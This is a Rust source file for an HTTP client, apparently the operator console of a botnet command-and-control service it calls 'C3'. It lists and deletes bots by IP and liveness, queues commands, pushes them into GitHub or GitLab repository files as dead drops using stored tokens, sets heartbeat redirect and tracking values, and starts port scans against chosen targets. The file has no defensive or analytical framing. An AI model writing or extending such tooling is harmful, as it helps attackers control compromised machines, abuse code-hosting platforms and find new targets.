//! HTTP client wrapping all C3 API endpoints.

use reqwest::Client;
use serde_json::Value;
use std::time::Duration;

pub struct ApiClient {
    base_url: String,
    token: String,
    client: Client,
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct BotInfo {
    pub id: String,
    pub ip: String,
    pub first_seen: f64,
    pub last_seen: f64,
    pub hits: u64,
    pub alive: bool,
}

#[derive(Debug, Clone)]
pub struct RepoInfo {
    pub id: usize,
    pub label: String,
    pub platform: String,
    pub owner: String,
    pub repo: String,
    pub branch: String,
    pub file_path: String,
    pub alive: bool,
}

#[derive(Debug, Clone)]
pub struct StatsInfo {
    pub bots_total: u64,
    pub bots_alive: u64,
    pub repos_total: u64,
    pub repos_alive: u64,
    pub commands_queued: u64,
    pub padding_enabled: bool,
}

#[derive(Debug, Clone)]
pub struct HeartbeatConfig {
    pub redirect: String,
    pub tracking: String,
    pub interval: u64,
}

impl ApiClient {
    pub fn new(base_url: &str, token: &str) -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .build()
            .unwrap_or_default();

        ApiClient {
            base_url: base_url.trim_end_matches('/').to_string(),
            token: token.to_string(),
            client,
        }
    }

    fn auth_header(&self) -> String {
        if self.token.is_empty() {
            String::new()
        } else {
            format!("Bearer {}", self.token)
        }
    }

    async fn get(&self, path: &str) -> Result<Value, String> {
        let url = format!("{}{}", self.base_url, path);
        let mut req = self.client.get(&url);
        if !self.token.is_empty() {
            req = req.header("Authorization", &self.auth_header());
        }
        let resp = req.send().await.map_err(|e| format!("HTTP error: {e}"))?;
        let status = resp.status();
        let json: Value = resp.json().await.map_err(|e| format!("JSON error: {e}"))?;
        if !status.is_success() {
            let msg = json["error"].as_str().unwrap_or("unknown error");
            return Err(format!("API {} ({}): {}", status.as_u16(), path, msg));
        }
        Ok(json)
    }

    async fn post(&self, path: &str, body: Value) -> Result<Value, String> {
        let url = format!("{}{}", self.base_url, path);
        let mut req = self.client.post(&url).json(&body);
        if !self.token.is_empty() {
            req = req.header("Authorization", &self.auth_header());
        }
        let resp = req.send().await.map_err(|e| format!("HTTP error: {e}"))?;
        let status = resp.status();
        let json: Value = resp.json().await.map_err(|e| format!("JSON error: {e}"))?;
        if !status.is_success() {
            let msg = json["error"].as_str().unwrap_or("unknown error");
            return Err(format!("API {} ({}): {}", status.as_u16(), path, msg));
        }
        Ok(json)
    }

    async fn put(&self, path: &str, body: Value) -> Result<Value, String> {
        let url = format!("{}{}", self.base_url, path);
        let mut req = self.client.put(&url).json(&body);
        if !self.token.is_empty() {
            req = req.header("Authorization", &self.auth_header());
        }
        let resp = req.send().await.map_err(|e| format!("HTTP error: {e}"))?;
        let status = resp.status();
        let json: Value = resp.json().await.map_err(|e| format!("JSON error: {e}"))?;
        if !status.is_success() {
            let msg = json["error"].as_str().unwrap_or("unknown error");
            return Err(format!("API {} ({}): {}", status.as_u16(), path, msg));
        }
        Ok(json)
    }

    async fn delete(&self, path: &str) -> Result<Value, String> {
        let url = format!("{}{}", self.base_url, path);
        let mut req = self.client.delete(&url);
        if !self.token.is_empty() {
            req = req.header("Authorization", &self.auth_header());
        }
        let resp = req.send().await.map_err(|e| format!("HTTP error: {e}"))?;
        let status = resp.status();
        let json: Value = resp.json().await.map_err(|e| format!("JSON error: {e}"))?;
        if !status.is_success() {
            let msg = json["error"].as_str().unwrap_or("unknown error");
            return Err(format!("API {} ({}): {}", status.as_u16(), path, msg));
        }
        Ok(json)
    }

    // ── Auth ───────────────────────────────────────────────────────────

    pub async fn whoami(&self) -> Result<String, String> {
        let json = self.get("/api/auth/whoami").await?;
        json["role"].as_str().map(|s| s.to_string()).ok_or("no role".into())
    }

    // ── Bots ───────────────────────────────────────────────────────────

    pub async fn list_bots(&self) -> Result<Vec<BotInfo>, String> {
        let json = self.get("/api/admin/bots").await?;
        let bots: Vec<BotInfo> = json["bots"].as_array().unwrap_or(&vec![]).iter().map(|b| BotInfo {
            id: b["id"].as_str().unwrap_or("?").to_string(),
            ip: b["ip"].as_str().unwrap_or("?").to_string(),
            first_seen: b["first_seen"].as_f64().unwrap_or(0.0),
            last_seen: b["last_seen"].as_f64().unwrap_or(0.0),
            hits: b["hits"].as_u64().unwrap_or(0),
            alive: b["alive"].as_bool().unwrap_or(false),
        }).collect();
        Ok(bots)
    }

    pub async fn delete_bot(&self, bot_id: &str) -> Result<Value, String> {
        self.delete(&format!("/api/admin/bots/{}", bot_id)).await
    }

    // ── Repos ──────────────────────────────────────────────────────────

    pub async fn list_repos(&self) -> Result<Vec<RepoInfo>, String> {
        let json = self.get("/api/admin/repos").await?;
        let repos: Vec<RepoInfo> = json["repos"].as_array().unwrap_or(&vec![]).iter().enumerate().map(|(i, r)| RepoInfo {
            id: i,
            label: r["label"].as_str().unwrap_or("?").to_string(),
            platform: r["platform"].as_str().unwrap_or("?").to_string(),
            owner: r["owner"].as_str().unwrap_or("").to_string(),
            repo: r["repo"].as_str().unwrap_or("").to_string(),
            branch: r["branch"].as_str().unwrap_or("main").to_string(),
            file_path: r["file_path"].as_str().unwrap_or("README.md").to_string(),
            alive: r["alive"].as_bool().unwrap_or(false),
        }).collect();
        Ok(repos)
    }

    pub async fn add_repo(&self, spec: &str) -> Result<Value, String> {
        self.post("/api/admin/repos", serde_json::json!({"repo": spec})).await
    }

    pub async fn remove_repo(&self, idx: usize) -> Result<Value, String> {
        self.delete(&format!("/api/admin/repos/{}", idx)).await
    }

    pub async fn check_repos(&self) -> Result<Value, String> {
        self.post("/api/admin/repos/check", serde_json::json!({})).await
    }

    // ── Commands ───────────────────────────────────────────────────────

    pub async fn list_commands(&self) -> Result<Vec<String>, String> {
        let json = self.get("/api/admin/commands").await?;
        let cmds: Vec<String> = json["commands"].as_array().unwrap_or(&vec![]).iter().filter_map(|c| c.as_str().map(|s| s.to_string())).collect();
        Ok(cmds)
    }

    pub async fn add_command(&self, cmd: &str) -> Result<Value, String> {
        self.post("/api/admin/commands", serde_json::json!({"cmd": cmd})).await
    }

    pub async fn remove_command(&self, idx: usize) -> Result<Value, String> {
        self.delete(&format!("/api/admin/commands/{}", idx)).await
    }

    pub async fn clear_commands(&self) -> Result<Value, String> {
        self.delete("/api/admin/commands").await
    }

    // ── Push / Pull ────────────────────────────────────────────────────

    pub async fn push(&self, index: Option<usize>, pad: bool) -> Result<Value, String> {
        let mut body = serde_json::json!({"pad": pad});
        if let Some(i) = index {
            body["index"] = serde_json::json!(i);
        }
        self.post("/api/admin/push", body).await
    }

    pub async fn pull(&self, idx: usize) -> Result<Value, String> {
        self.get(&format!("/api/admin/pull/{}", idx)).await
    }

    pub async fn preview(&self) -> Result<Value, String> {
        self.get("/api/admin/preview").await
    }

    pub async fn create_paste(&self) -> Result<Value, String> {
        self.post("/api/admin/paste", serde_json::json!({})).await
    }

    // ── Heartbeat ──────────────────────────────────────────────────────

    pub async fn get_heartbeat(&self) -> Result<HeartbeatConfig, String> {
        let json = self.get("/api/admin/heartbeat").await?;
        Ok(HeartbeatConfig {
            redirect: json["redirect"].as_str().unwrap_or("").to_string(),
            tracking: json["tracking"].as_str().unwrap_or("").to_string(),
            interval: json["interval"].as_u64().unwrap_or(300),
        })
    }

    pub async fn set_heartbeat(&self, redirect: Option<&str>, tracking: Option<&str>, interval: Option<u64>) -> Result<Value, String> {
        let mut body = serde_json::json!({});
        if let Some(r) = redirect { body["redirect"] = serde_json::json!(r); }
        if let Some(t) = tracking { body["tracking"] = serde_json::json!(t); }
        if let Some(i) = interval { body["interval"] = serde_json::json!(i); }
        self.put("/api/admin/heartbeat", body).await
    }

    // ── Tokens ─────────────────────────────────────────────────────────

    pub async fn set_tokens(&self, github: Option<&str>, gitlab: Option<&str>) -> Result<Value, String> {
        let mut body = serde_json::json!({});
        if let Some(g) = github { body["github_token"] = serde_json::json!(g); }
        if let Some(g) = gitlab { body["gitlab_token"] = serde_json::json!(g); }
        self.put("/api/admin/tokens", body).await
    }

    // ── Padding ────────────────────────────────────────────────────────

    pub async fn toggle_padding(&self, enabled: Option<bool>) -> Result<Value, String> {
        let body = if let Some(e) = enabled {
            serde_json::json!({"enabled": e})
        } else {
            serde_json::json!({})
        };
        self.put("/api/admin/padding", body).await
    }

    // ── Config ─────────────────────────────────────────────────────────

    pub async fn save_config(&self) -> Result<Value, String> {
        self.post("/api/admin/config/save", serde_json::json!({})).await
    }

    // ── Stats ──────────────────────────────────────────────────────────

    pub async fn get_stats(&self) -> Result<StatsInfo, String> {
        let json = self.get("/api/admin/stats").await?;
        Ok(StatsInfo {
            bots_total: json["bots_total"].as_u64().unwrap_or(0),
            bots_alive: json["bots_alive"].as_u64().unwrap_or(0),
            repos_total: json["repos_total"].as_u64().unwrap_or(0),
            repos_alive: json["repos_alive"].as_u64().unwrap_or(0),
            commands_queued: json["commands_queued"].as_u64().unwrap_or(0),
            padding_enabled: json["padding_enabled"].as_bool().unwrap_or(false),
        })
    }

    // ── Scanner ───────────────────────────────────────────────────────

    pub async fn start_scan(&self, target: &str, ports: &str, max_targets: u64) -> Result<Value, String> {
        self.post("/api/admin/scan/start", serde_json::json!({
            "target": target, "ports": ports, "targets_total": max_targets
        })).await
    }

    pub async fn stop_scan(&self) -> Result<Value, String> {
        self.post("/api/admin/scan/stop", serde_json::json!({})).await
    }

    pub async fn get_scan_status(&self) -> Result<Value, String> {
        self.get("/api/admin/scan/status").await
    }

    pub async fn get_scan_results(&self) -> Result<Value, String> {
        self.get("/api/admin/scan/results").await
    }

    pub async fn clear_scan(&self) -> Result<Value, String> {
        self.delete("/api/admin/scan/results").await
    }
}
